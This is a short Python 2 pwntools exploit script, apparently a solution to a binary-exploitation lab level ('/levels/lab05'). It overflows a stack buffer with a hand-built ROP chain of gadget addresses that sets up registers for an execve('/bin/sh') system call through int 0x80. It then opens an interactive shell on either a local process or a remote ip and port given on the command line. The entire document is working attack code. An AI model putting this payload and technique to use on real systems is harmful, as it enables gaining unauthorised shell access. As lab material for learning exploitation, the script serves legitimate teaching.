#!/usr/bin/env python2

from pwn import *
import sys

env = ""
binary = ""

ip = None
port = None

b = None
p = None

loot = {
}

def exploit():
    global b, p, settings

    load_env()

    payload = "/bin/sh\x00"
    payload += p32(0xbffffdd0)
    payload += "\x00" * 0x7c
    payload += "B" * 0x4
    payload += p32(0x080bbf26) # pop eax
    payload += p32(0xb) # execve

    payload += p32(0x080481c9) # pop ebx
    payload += p32(0xbffffdd0) # /bin/sh addr

    payload += p32(0x080e55ad) # pop ecx
    payload += p32(0xbffffdd8) #  addr of /bin/sh pointer

    payload += p32(0x0806ec5a) # pop edx
    payload += p32(0x0)
    payload += p32(0x0806f31f) # int 0x80

    p.sendline(payload)

    p.interactive()

def load_env():
    global b, p

    b = ELF(binary)

    if env == "local":
        p = process([binary], env={
            "PWD": "/levels/lab05",
            "SHLVL": "0"
            })
        log.info(util.proc.pidof(p))
        pause()

    elif env == "remote":
        p = remote(ip, port)


def usage():
    print "Usage: ./%s [binary] [local|remote] <ip> <port>" % sys.argv[0]


if __name__ == '__main__':
    args = sys.argv

    if len(args) < 3:
        usage()
        exit()

    binary = sys.argv[1]
    env = sys.argv[2]

    if env == "remote":
        if len(args) != 5:
            usage()
            exit()
        else:
            ip = sys.argv[3]
            port = int(sys.argv[4])

    exploit()
